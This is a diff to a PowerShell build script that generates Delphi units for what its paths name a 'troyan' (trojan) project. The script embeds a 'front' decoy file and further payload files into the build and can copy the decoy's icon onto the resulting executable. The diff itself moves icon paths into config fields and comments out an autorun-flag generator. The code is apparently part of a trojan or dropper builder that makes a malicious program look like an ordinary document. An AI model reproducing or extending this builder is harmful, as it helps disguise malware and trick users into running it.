@@ -151,14 +151,12 @@ function Create-EmbeddingFiles {
     $rcFile = Join-Path -Path $server.troyanDelphiDir -ChildPath "_$name.rc"
     $delphiFile = Join-Path -Path $server.troyanDelphiDir -ChildPath "_$name.pas"
     $unitName = "_$name";
-    $iconFile = Join-Path -Path $server.troyanDelphiDir -ChildPath "_icon.ico"
-    $currentIconFile = Join-Path -Path $server.userDataDir -ChildPath "server.ico"
 
-    if (-not (Test-Path -Path $currentIconFile))
+    if (-not (Test-Path -Path $server.userDelphiIco))
     {
-        Copy-Item -Path (Join-Path -Path $server.rootDir -ChildPath "defaulticon.ico") -Destination $iconFile -Force
+        Copy-Item -Path $server.defaultIco -Destination $server.troyanDelphiIco -Force
     } else {
-        Copy-Item -Path $currentIconFile -Destination $iconFile -Force
+        Copy-Item -Path $server.userDelphiIco -Destination $server.troyanDelphiIco -Force
     }
 
     if (-not (Test-Path -Path $srcFolder))
@@ -182,7 +180,7 @@ function Create-EmbeddingFiles {
         if ($name -eq "front")
         {
             if ($server.extractIconFromFront -eq $true){
-                Extract-Icon -filePath $file.FullName -outPath $iconFile
+                Extract-Icon -filePath $file.FullName -outPath $server.troyanDelphiIco
             }
         }
         $filename = [System.IO.Path]::GetFileName($file.FullName)
@@ -191,7 +189,7 @@ function Create-EmbeddingFiles {
         $idx++
         $delphiArray += "'" + $filename + "'"
     }
-    Copy-Item -Path $iconFile -Destination $currentIconFile -Force
+    Copy-Item -Path $server.troyanDelphiIco -Destination $server.userDelphiIco -Force
 
     $template = @"
 unit NAME;
@@ -232,37 +230,34 @@ end.
     $streamWriter.Close()
 }
 
+# function Create-Contst
+# {
+#     $template = @"
+# unit _consts;
 
-function Create-AutoRun
-{
-    $template = @"
-unit _consts;
+# interface
 
-interface
+# const
+#     IsAutoRun: Boolean = {UseAutoRun};
 
-const
-    IsAutoRun: Boolean = {UseAutoRun};
+# implementation
 
-implementation
-
-end.
-"@
-    if ($server.autoStart)
-    {
-        $content = "True"
-    } else 
-    {
-        $content = "False"        
-    }
-    $template  = $template -replace "{UseAutoRun}", $content
-    $delphiFile = Join-Path -Path $server.troyanDelphiDir -ChildPath "_consts.pas"
-    $encoding = New-Object System.Text.UTF8Encoding $false 
-    $streamWriter = New-Object System.IO.StreamWriter($delphiFile, $false, $encoding)
-    $streamWriter.Write($template)
-    $streamWriter.Close()
-}
+# end.
+# "@
+#     if ($server.autoStart)
+#     {
+#         $content = "True"
+#     } else 
+#     {
+#         $content = "False"        
+#     }
+#     $template  = $template -replace "{UseAutoRun}", $content
+#     $delphiFile = Join-Path -Path $server.troyanDelphiDir -ChildPath "_consts.pas"
+#     $encoding = New-Object System.Text.UTF8Encoding $false 
+#     $streamWriter = New-Object System.IO.StreamWriter($delphiFile, $false, $encoding)
+#     $streamWriter.Write($template)
+#     $streamWriter.Close()
+# }
 
 Create-EmbeddingFiles -name "front" -startIndex 8000
 Create-EmbeddingFiles -name "embeddings" -startIndex 9000
-
-Create-AutoRun;
